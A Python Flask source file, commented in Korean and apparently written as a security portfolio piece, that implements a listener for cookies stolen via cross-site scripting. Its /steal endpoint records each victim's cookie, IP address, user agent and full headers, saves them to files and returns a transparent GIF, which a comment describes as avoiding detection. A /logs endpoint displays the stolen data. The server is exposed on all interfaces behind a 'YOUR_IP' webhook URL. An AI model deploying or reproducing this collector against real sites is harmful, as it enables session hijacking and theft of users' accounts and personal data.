#!/usr/bin/env python3
"""
Cookie Listener Server - 탈취한 쿠키를 수신하는 서버
포트폴리오 목적: 실전형 쿠키 탈취 시뮬레이션
"""

from flask import Flask, request, jsonify
from datetime import datetime
import json
import os
import logging

app = Flask(__name__)

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('stolen_cookies.log'),
        logging.StreamHandler()
    ]
)

# 쿠키 저장 디렉토리
COOKIE_DIR = 'stolen_cookies'
os.makedirs(COOKIE_DIR, exist_ok=True)

@app.route('/steal', methods=['GET', 'POST'])
def steal_cookie():
    """XSS를 통해 전송된 쿠키를 수신"""
    try:
        # 쿠키 데이터 추출
        cookie = request.args.get('c') or request.form.get('c') or request.json.get('c') if request.is_json else None

        if not cookie:
            return jsonify({'status': 'error', 'message': 'No cookie received'}), 400

        # 추가 정보 수집
        data = {
            'timestamp': datetime.now().isoformat(),
            'cookie': cookie,
            'ip': request.headers.get('X-Forwarded-For', request.remote_addr),
            'user_agent': request.headers.get('User-Agent'),
            'referer': request.headers.get('Referer'),
            'headers': dict(request.headers)
        }

        # 파일로 저장
        filename = f"{COOKIE_DIR}/cookie_{datetime.now().strftime('%Y%m%d_%H%M%S')}.json"
        with open(filename, 'w') as f:
            json.dump(data, f, indent=2)

        # 로그 출력
        logging.info(f"🎯 Cookie Stolen!")
        logging.info(f"   Cookie: {cookie[:50]}...")
        logging.info(f"   IP: {data['ip']}")
        logging.info(f"   Saved: {filename}")

        # 1x1 투명 이미지 반환 (탐지 회피)
        return (
            b'\x47\x49\x46\x38\x39\x61\x01\x00\x01\x00\x80\x00\x00\xff\xff\xff'
            b'\x00\x00\x00\x21\xf9\x04\x01\x00\x00\x00\x00\x2c\x00\x00\x00\x00'
            b'\x01\x00\x01\x00\x00\x02\x02\x44\x01\x00\x3b',
            200,
            {'Content-Type': 'image/gif'}
        )

    except Exception as e:
        logging.error(f"❌ Error: {e}")
        return jsonify({'status': 'error', 'message': str(e)}), 500

@app.route('/health', methods=['GET'])
def health():
    """헬스체크 엔드포인트"""
    return jsonify({'status': 'ok', 'message': 'Cookie listener is running'})

@app.route('/logs', methods=['GET'])
def view_logs():
    """수집된 쿠키 로그 조회"""
    cookies = []
    for filename in sorted(os.listdir(COOKIE_DIR), reverse=True)[:10]:
        if filename.endswith('.json'):
            with open(f"{COOKIE_DIR}/{filename}", 'r') as f:
                cookies.append(json.load(f))
    return jsonify({'count': len(cookies), 'cookies': cookies})

if __name__ == '__main__':
    print("\n" + "="*60)
    print("🎯 Cookie Listener Server Started")
    print("="*60)
    print(f"📡 Listening on: http://0.0.0.0:9999")
    print(f"📂 Logs saved to: {COOKIE_DIR}/")
    print(f"🔗 Webhook URL: http://YOUR_IP:9999/steal")
    print("="*60 + "\n")

    # 외부 접근 가능하도록 0.0.0.0으로 바인딩
    app.run(host='0.0.0.0', port=9999, debug=False)
